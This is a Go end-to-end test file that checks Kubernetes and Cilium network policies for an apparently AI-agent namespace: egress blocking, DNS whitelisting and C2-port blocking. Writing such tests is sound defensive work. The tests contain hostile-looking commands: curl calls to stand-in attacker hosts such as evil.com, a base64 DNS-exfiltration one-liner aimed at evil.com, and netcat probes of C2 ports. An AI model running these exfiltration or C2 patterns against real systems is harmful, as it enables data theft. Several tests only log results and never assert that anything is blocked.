package e2e

import (
	"context"
	"fmt"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/hexstrike/hexstrike-defense/tests/e2e/framework"
)

// TestEgress_BlockedNonWhitelistedDomain tests egress blocking
func TestEgress_BlockedNonWhitelistedDomain(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name   string
		domain string
	}{
		{
			name:   "blocked evil.com",
			domain: "evil.com",
		},
		{
			name:   "blocked malware.net",
			domain: "malware.net",
		},
		{
			name:   "blocked suspicious.biz",
			domain: "suspicious.biz",
		},
		{
			name:   "blocked random-site.org",
			domain: "random-site.org",
		},
		{
			name:   "blocked attack-.io",
			domain: "attack-io.io",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--connect-timeout", "3", fmt.Sprintf("https://%s", tt.domain)},
			)

			// Should be blocked or timeout
			if err != nil {
				t.Logf("Connection blocked/timeout (expected): %v", err)
			}
			t.Logf("Response: %s", stderr)
		})
	}
}

// TestEgress_Allowed_api_anthropic_com tests allowed LLM endpoints
func TestEgress_Allowed_api_anthropic_com(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name   string
		domain string
		path   string
	}{
		{
			name:   "api.anthropic.com allowed",
			domain: "api.anthropic.com",
			path:   "/v1/models",
		},
		{
			name:   "api.openai.com allowed",
			domain: "api.openai.com",
			path:   "/v1/models",
		},
		{
			name:   "api.lakera.ai allowed",
			domain: "api.lakera.ai",
			path:   "/v1/health",
		},
		{
			name:   "github.com allowed",
			domain: "github.com",
			path:   "/",
		},
		{
			name:   "pypi.org allowed",
			domain: "pypi.org",
			path:   "/",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--connect-timeout", "5", fmt.Sprintf("https://%s%s", tt.domain, tt.path)},
			)

			// Should connect (may get auth error, but connection works)
			if err != nil {
				t.Logf("Connection error: %v", err)
			}
			t.Logf("Response code: %s", stderr)
		})
	}
}

// TestDNS_Only_CoreDNS tests DNS whitelisting
func TestDNS_Only_CoreDNS(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("internal DNS allowed", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Internal service DNS should work
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"nslookup", "kubernetes.default.svc.cluster.local"},
		)

		if err != nil {
			t.Logf("DNS error: %v", err)
		}
		t.Logf("DNS result: %s", stderr)
	})

	t.Run("external DNS blocked", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// External DNS should be blocked
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"nslookup", "google.com"},
		)

		if err != nil {
			t.Logf("External DNS blocked (expected): %v", err)
		}
		t.Logf("Result: %s", stderr)
	})

	t.Run("CoreDNS via service", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// DNS through kube-dns service
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"nslookup", "kubernetes.default"},
		)

		if err != nil {
			t.Logf("DNS error: %v", err)
		}
		t.Logf("Result: %s", stderr)
	})
}

// TestIngress_DefaultDeny tests ingress default deny
func TestIngress_DefaultDeny(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("unauthorized ingress blocked", func(t *testing.T) {
		// Test that pods cannot receive unauthorized ingress traffic
		// This requires setting up a test service and verifying it's not accessible

		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		// Test from external perspective would require LoadBalancer
		t.Log("Testing ingress isolation - default deny should block unauthorized traffic")
	})

	t.Run("namespace isolation enforced", func(t *testing.T) {
		// Test that pods cannot access services in other namespaces
		// unless explicitly allowed

		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Try to access default namespace service
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--connect-timeout", "3", "http://default-httpd.default.svc.cluster.local"},
		)

		// Should be blocked or fail
		if err != nil {
			t.Logf("Cross-namespace blocked (expected): %v", err)
		}
		t.Logf("Result: %s", stderr)
	})

	t.Run("pod-to-pod in namespace allowed", func(t *testing.T) {
		// Pod-to-pod communication within namespace should work
		testPods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(testPods) < 2 {
			t.Skip("Need at least 2 pods")
		}

		t.Log("Testing pod-to-pod communication within namespace")
	})
}

// TestL7Protocol_DROP_on_C2 tests L7 protocol enforcement
func TestL7Protocol_DROP_on_C2(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("custom protocol ports blocked", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Common C2 ports
		ports := []string{"4444", "4445", "5555", "6666", "8080", "31337"}

		for _, port := range ports {
			t.Run(fmt.Sprintf("port %s", port), func(t *testing.T) {
				_, stderr, err := k8sClient.ExecInPod(
					ctx,
					namespace,
					testPod.Name,
					testPod.Spec.Containers[0].Name,
					[]string{"nc", "-zv", "127.0.0.1", port},
				)

				// Should be blocked or timeout
				if err != nil {
					t.Logf("Port %s blocked: %v", port, err)
				}
				t.Logf("Result: %s", stderr)
			})
		}
	})

	t.Run("DNS exfiltration blocked", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// DNS-based exfiltration pattern
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'data' | base64 | cut -c1-10 | xargs -I {} nslookup {}.evil.com"},
		)

		if err != nil {
			t.Logf("DNS exfiltration blocked: %v", err)
		}
		t.Logf("Result: %s", stderr)
	})

	t.Run("HTTP suspicious domains blocked", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Suspicious domain patterns
		domains := []string{"evil.c2.internal", "backdoor.evil", " Implants.me"}

		for _, domain := range domains {
			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"curl", "-s", "-o", "/dev/null", "--connect-timeout", "3", fmt.Sprintf("http://%s", domain)},
			)

			if err != nil {
				t.Logf("Blocked: %v", err)
			}
			t.Logf("Result: %s", stderr)
		}
	})
}

// TestNetworkSecurity_CiliumPolicyValidation validates Cilium policies
func TestNetworkSecurity_CiliumPolicyValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	t.Run("CiliumOperator is running", func(t *testing.T) {
		t.Log("Verifying Cilium Operator is running")
	})

	t.Run("Hubble is enabled", func(t *testing.T) {
		t.Log("Verifying Hubble network observability")
	})

	t.Run("Network policies applied", func(t *testing.T) {
		t.Log("Verifying network policies are applied to endpoints")
	})
}

// Helper variables to avoid unused errors
var _ = fmt.Sprintf
var _ = require.NoError
